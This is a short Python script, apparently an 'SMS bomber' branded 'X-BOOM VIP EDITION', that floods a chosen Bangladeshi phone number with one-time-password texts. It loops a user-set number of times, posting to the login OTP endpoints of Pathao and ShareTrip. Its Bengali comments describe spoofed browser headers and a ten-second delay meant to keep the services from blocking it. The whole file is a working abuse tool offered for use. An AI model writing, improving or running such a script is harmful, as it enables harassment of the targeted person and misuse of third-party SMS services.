import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        X-BOOM VIP EDITION             ")
    print("     LINK: mmalekislam788-creator      ")
    print("========================================")

def send_sms(target, count):
    url1 = "https://api-hermes.pathao.com/user/otp-send/login"
    url2 = "https://api.sharetrip.net/api/v1/otp/send"
    
    # শক্তিশালী হেডার্স যা ব্লক এড়াতে সাহায্য করবে
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://pathao.com",
        "Referer": "https://pathao.com/"
    }
    
    print(f"\n[+] Target Connected: {target}")
    for i in range(count):
        try:
            # Pathao API
            requests.post(url1, json={"phone": "+88"+target}, headers=headers, timeout=10)
            # ShareTrip API
            requests.post(url2, json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=10)
            
            print(f"[!] SMS {i+1} Sent Successfully!")
        except:
            print(f"[-] SMS {i+1} Failed")
        
        # ১০ সেকেন্ড গ্যাপ দিন, এতে সার্ভার আপনাকে ব্লক করবে না
        time.sleep(10)

def main():
    banner()
    num = input("Enter Phone (01xxxxxxxxx): ")
    amt = int(input("Enter Amount: "))
    send_sms(num, amt)

if __name__ == "__main__":
    main()

